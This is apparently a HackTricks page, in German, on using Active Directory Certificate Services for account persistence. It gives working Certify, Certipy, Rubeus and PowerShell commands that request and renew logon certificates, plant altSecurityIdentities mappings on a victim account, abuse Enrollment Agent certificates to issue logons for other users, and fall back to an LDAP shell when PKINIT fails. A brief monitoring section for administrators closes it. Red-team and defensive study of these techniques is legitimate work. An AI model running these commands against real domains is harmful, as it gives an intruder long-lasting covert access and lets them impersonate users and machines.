# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Dies ist eine kurze Zusammenfassung der Kapitel zur account persistence aus der großartigen Forschung von [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Understanding Active User Credential Theft with Certificates – PERSIST1

In einem Szenario, in dem ein Zertifikat, das Domain authentication erlaubt, von einem Benutzer angefordert werden kann, hat ein Angreifer die Möglichkeit, dieses Zertifikat anzufordern und zu stehlen, um persistence in einem Netzwerk aufrechtzuerhalten. Standardmäßig erlaubt das `User` template in Active Directory solche Anfragen, obwohl es manchmal deaktiviert sein kann.

Mit [Certify](https://github.com/GhostPack/Certify) oder [Certipy](https://github.com/ly4k/Certipy) kannst du nach aktivierten templates suchen, die client authentication erlauben, und dann eines anfordern:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Die Stärke eines Zertifikats liegt in seiner Fähigkeit, sich als der Benutzer zu authentifizieren, dem es gehört, unabhängig von Passwortänderungen, solange das Zertifikat gültig bleibt.

Du kannst PEM in PFX konvertieren und es verwenden, um ein TGT zu erhalten:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Hinweis: In Kombination mit anderen Techniken (siehe THEFT-Abschnitte) ermöglicht die auf Zertifikaten basierende Authentifizierung dauerhaften Zugriff, ohne LSASS zu berühren, und sogar aus nicht erhöhten Kontexten.

## Machine Persistence mit Zertifikaten gewinnen - PERSIST2

Wenn ein Angreifer auf einem Host erhöhte Privilegien hat, kann er das Machine Account des kompromittierten Systems für ein Zertifikat über die Standardvorlage `Machine` enrollen. Die Authentifizierung als Maschine ermöglicht S4U2Self für lokale Services und kann dauerhafte Host Persistence bieten:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Ausdehnen der Persistenz durch Zertifikatserneuerung - PERSIST3

Das Ausnutzen der Gültigkeits- und Erneuerungszeiträume von certificate templates ermöglicht es einem Angreifer, langfristigen Zugriff aufrechtzuerhalten. Wenn du ein zuvor ausgestelltes Zertifikat und seinen privaten Schlüssel besitzt, kannst du es vor dem Ablauf erneuern, um ein neues, langzeitgültiges credential zu erhalten, ohne zusätzliche request artifacts zu hinterlassen, die mit dem ursprünglichen principal verknüpft sind.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: Verfolge die Laufzeiten von attacker-held PFX-Dateien und erneuere sie frühzeitig. Eine Erneuerung kann außerdem dazu führen, dass aktualisierte Zertifikate die moderne SID mapping Extension enthalten, wodurch sie unter strengeren DC mapping-Regeln nutzbar bleiben (siehe nächster Abschnitt).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Wenn du in das `altSecurityIdentities`-Attribut eines Zielkontos schreiben kannst, kannst du ein von dir kontrolliertes Zertifikat explizit diesem Konto zuordnen. Das bleibt über Passwortänderungen hinweg bestehen und funktioniert bei Verwendung starker mapping-Formate auch unter moderner DC enforcement.

High-level flow:

1. Erhalte oder stelle ein Client-auth-Zertifikat aus, das du kontrollierst (z. B. `User` template als du selbst enrollen).
2. Extrahiere einen starken Identifier aus dem Zertifikat (Issuer+Serial, SKI oder SHA1-PublicKey).
3. Füge auf dem `altSecurityIdentities`-Attribut des Ziel-Principals ein explizites mapping mit diesem Identifier hinzu.
4. Authentifiziere dich mit deinem Zertifikat; der DC mappt es über das explizite mapping auf das Opfer.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Dann authentifizieren Sie sich mit Ihrem PFX. Certipy wird direkt ein TGT erhalten:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Starke `altSecurityIdentities`-Mappings aufbauen

In der Praxis sind **Issuer+Serial**- und **SKI**-Mappings die einfachsten starken Formate, die sich aus einem von einem Angreifer gehaltenen Zertifikat erstellen lassen. Das ist nach dem **11. Februar 2025** wichtig, wenn DCs standardmäßig auf **Full Enforcement** setzen und schwache Mappings nicht mehr zuverlässig funktionieren.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notizen
- Verwende nur starke Mapping-Typen: `X509IssuerSerialNumber`, `X509SKI` oder `X509SHA1PublicKey`. Schwache Formate (Subject/Issuer, nur Subject, RFC822-E-Mail) sind veraltet und können durch DC-Richtlinien blockiert werden.
- Das Mapping funktioniert sowohl auf **user**- als auch auf **computer**-Objekten, daher reicht Schreibzugriff auf `altSecurityIdentities` eines Computer-Accounts aus, um sich als diese Maschine zu persistieren.
- Die Zertifikatskette muss bis zu einer Root aufgebaut werden, der der DC vertraut. Enterprise CAs in NTAuth werden typischerweise vertraut; einige Umgebungen vertrauen auch öffentlichen CAs.
- Schannel-Authentifizierung bleibt auch dann nützlich für Persistence, wenn PKINIT fehlschlägt, weil dem DC die Smart Card Logon EKU fehlt oder er `KDC_ERR_PADATA_TYPE_NOSUPP` zurückgibt.

#### 2025+ `Issuer/SID` explizite Mappings

Auf **Windows Server 2022+** Domain Controllern mit dem **9. September 2025** Security Update hat Microsoft ein weiteres starkes explizites Mapping-Format hinzugefügt, das für Persistence attraktiv ist, weil es eine erneute Ausstellung des Zertifikats durch dieselbe CA übersteht:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operativ unterscheidet sich das von den älteren starken Formaten:
- `Issuer+Serial` pinnt **ein genaues Zertifikat**.
- `SKI` / `SHA1-PUKEY` pinnt **ein Schlüsselpaar**.
- `Issuer/SID` pinnt die **ausstellende CA + target SID**, sodass erneuerte oder neu ausgestellte Zertifikate derselben CA weiter funktionieren, ohne `altSecurityIdentities` neu zu schreiben.

Anforderungen und Einschränkungen
- Das für den Logon präsentierte Zertifikat muss die target Account SID tatsächlich in der SID security extension enthalten.
- Dieses Format ist nicht hilfreich für Zertifikate im `ESC9` / `ESC16`-Stil, die die SID extension weglassen; in solchen Fällen auf `Issuer+Serial`, `SKI` oder `SHA1-PUKEY` zurückfallen.

Weitere Informationen zu weak explicit mappings und Angriffspfaden siehe:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent als Persistence – PERSIST5

Wenn du ein gültiges Certificate Request Agent/Enrollment Agent-Zertifikat erhältst, kannst du jederzeit neue logon-fähige Zertifikate im Namen von Benutzern ausstellen und das Agent PFX offline als Persistence-Token aufbewahren. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Widerruf des Agent-Zertifikats oder der Vorlagenberechtigungen ist erforderlich, um diese Persistence zu entfernen.

Operational notes
- Moderne `Certipy`-Versionen unterstützen sowohl `-on-behalf-of` als auch `-renew`, sodass ein Angreifer mit einem Enrollment Agent PFX später Leaf certificates erneuern kann, ohne das ursprüngliche Zielkonto erneut zu berühren.
- Wenn PKINIT-basiertes TGT-Retrieval nicht möglich ist, ist das resultierende on-behalf-of-Zertifikat weiterhin für Schannel-Authentifizierung mit `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell` nutzbar.

## Using Persisted Certificates When PKINIT Fails

Wenn der DC kein Smart Card Logon-fähiges Zertifikat hat, kann Certificate logon via PKINIT mit `KDC_ERR_PADATA_TYPE_NOSUPP` fehlschlagen. Das beendet die Persistence primitive **nicht**: Das gleiche PFX ist oft weiterhin für Schannel-authentifizierten LDAP-Zugriff nutzbar.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Dies ist besonders nützlich nach PERSIST4/PERSIST5, weil du weiterhin von Linux/macOS aus arbeiten und andere Directory-Persistence-Aktionen ketten kannst, etwa das Ablegen von [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) oder das Bearbeiten beschreibbarer Delegation-Attribute.

## 2025 Strong Certificate Mapping Enforcement: Auswirkung auf Persistence

Microsoft KB5014754 hat Strong Certificate Mapping Enforcement auf Domain Controllern eingeführt. Seit dem **11. Februar 2025** verwenden DCs standardmäßig **Full Enforcement** für schwache/mehrdeutige Mappings, und seit dem Sicherheitsupdate vom **9. September 2025** unterstützen gepatchte DCs den alten Compatibility-Mode-Fallback nicht mehr. Praktische Auswirkungen:

- Zertifikate vor 2022, denen die SID-Mapping-Erweiterung fehlt, können bei Full Enforcement auf DCs bei implizitem Mapping fehlschlagen. Angreifer können den Zugang entweder durch Erneuerung von Zertifikaten über AD CS aufrechterhalten (um die SID-Erweiterung zu erhalten) oder durch das Platzieren eines starken expliziten Mappings in `altSecurityIdentities` (PERSIST4).
- Explizite Mappings mit starken Formaten (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` und auf modernen DCs `Issuer/SID`) funktionieren weiterhin. Schwache Formate (Issuer/Subject, nur Subject, RFC822) können blockiert werden und sollten für Persistence vermieden werden.
- Wenn schwache Mappings scheinbar trotzdem funktionieren, gehe davon aus, dass du einen ungepatchten oder anders konfigurierten DC getroffen hast und nicht einen zuverlässigen langfristigen Persistence-Pfad.
- `ESC9` / `ESC16`-artige Ausstellungspfade, die die SID-Erweiterung unterdrücken, machen `Issuer/SID` unbrauchbar, daher sind fallback-strong mappings oder eine Erneuerung über eine normale Vorlage die praktische Persistence-Option.

Administratoren sollten überwachen und alarmieren auf:
- Änderungen an `altSecurityIdentities` sowie Ausstellungen/Erneuerungen von Enrollment Agent- und User-Zertifikaten.
- CA-Ausstellungslogs für On-behalf-of-Anfragen und ungewöhnliche Erneuerungsmuster.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
